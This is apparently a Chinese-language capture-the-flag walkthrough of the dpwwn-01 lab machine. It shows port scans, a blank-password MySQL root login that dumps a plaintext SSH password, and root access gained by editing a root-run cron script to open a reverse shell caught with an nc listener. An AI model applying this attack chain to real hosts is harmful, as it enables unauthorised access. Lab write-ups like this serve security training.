
## 端口扫描

```bash
┌──(kali㉿kali)-[~/workspace]
└─$ sudo nmap -sT --min-rate 9999 -p- 10.10.10.30
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 06:52 EDT
Nmap scan report for 10.10.10.30
Host is up (0.0029s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 00:0C:29:93:02:FA (VMware)

┌──(kali㉿kali)-[~/workspace]
└─$ sudo nmap -sT -sCV -O -p22,80,3306 10.10.10.30 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 07:10 EDT
Nmap scan report for 10.10.10.30
Host is up (0.0030s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 c1:d3:be:39:42:9d:5c:b4:95:2c:5b:2e:20:59:0e:3a (RSA)
|   256 43:4a:c6:10:e7:17:7d:a0:c0:c3:76:88:1d:43:a1:8c (ECDSA)
|_  256 0e:cc:e3:e1:f7:87:73:a1:03:47:b9:e2:cf:1c:93:15 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
3306/tcp open  mysql   MySQL (blocked - too many connection errors)
MAC Address: 00:0C:29:93:02:FA (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.04 seconds


┌──(kali㉿kali)-[~]
└─$ sudo nmap -sT --script vuln -p22,80,3306 10.10.10.30
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 06:53 EDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.30
Host is up (0.00055s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
| http-enum: 
|   /info.php: Possible information file
|_  /icons/: Potentially interesting folder w/ directory listing
3306/tcp open  mysql
MAC Address: 00:0C:29:93:02:FA (VMware)
```

## web渗透
经过目录扫描，info.php信息收集
没有可利用路径


## mysql空密码登录

```bash
                                                                                                                                                                         
┌──(kali㉿kali)-[~/workspace]
└─$ mysql -h 10.10.10.30 -u root -p
Enter password: 
ERROR 1129 (HY000): Host '10.10.10.15' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
                                                                                                                                                                          
┌──(kali㉿kali)-[~/workspace]
└─$ mysql -h 10.10.10.30 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2
Server version: 5.5.60-MariaDB MariaDB Server

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

寻找用户密码信息

```sql
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| ssh                |
+--------------------+
4 rows in set (0.036 sec)

MariaDB [(none)]> use ssh;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [ssh]> show tables;
+---------------+
| Tables_in_ssh |
+---------------+
| users         |
+---------------+
1 row in set (0.010 sec)

MariaDB [ssh]> select * from users;
+----+----------+---------------------+
| id | username | password            |
+----+----------+---------------------+
|  1 | mistic   | testP@$$swordmistic |
+----+----------+---------------------+
1 row in set (0.004 sec)
```

## ssh立足点+提权

拿到密码直接登了

```bash
[mistic@dpwwn-01 ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

*/3 *  * * *  root  /home/mistic/logrot.sh
[mistic@dpwwn-01 ~]$ ls -la
总用量 20
drwx------. 2 mistic mistic 100 8月   1 2019 .
drwxr-xr-x. 3 root   root    20 8月   1 2019 ..
-rw-------. 1 mistic mistic  90 3月  11 07:46 .bash_history
-rw-r--r--. 1 mistic mistic  18 10月 30 2018 .bash_logout
-rw-r--r--. 1 mistic mistic 193 10月 30 2018 .bash_profile
-rw-r--r--. 1 mistic mistic 231 10月 30 2018 .bashrc
-rwx------. 1 mistic mistic 503 3月  11 07:47 logrot.sh
[mistic@dpwwn-01 ~]$ cat logrot.sh 
#!/bin/bash
#
#LOGFILE="/var/tmp"
#SEMAPHORE="/var/tmp.semaphore"


while : ; do
  read line
  while [[ -f $SEMAPHORE ]]; do
    sleep 1s
  done
  printf "%s\n" "$line" >> $LOGFILE
done

```
看到这个定时任务就很容易了
看到执行权限还是root，而属主是我，那么随便更改，反弹一个shell过来即可
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ sudo nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.10.15] from (UNKNOWN) [10.10.10.30] 55212
sh: no job control in this shell
sh-4.2# whoami
whoami
root
sh-4.2# ls /root
ls /root
anaconda-ks.cfg
dpwwn-01-FLAG.txt
sh-4.2# cat /root/dpwwn-01-FLAG.txt
cat /root/dpwwn-01-FLAG.txt

Congratulation! I knew you can pwn it as this very easy challenge. 

Thank you. 


64445777
6e643634 
37303737 
37373665 
36347077 
776e6450 
4077246e
33373336 
36359090
sh-4.2# 
```
提权了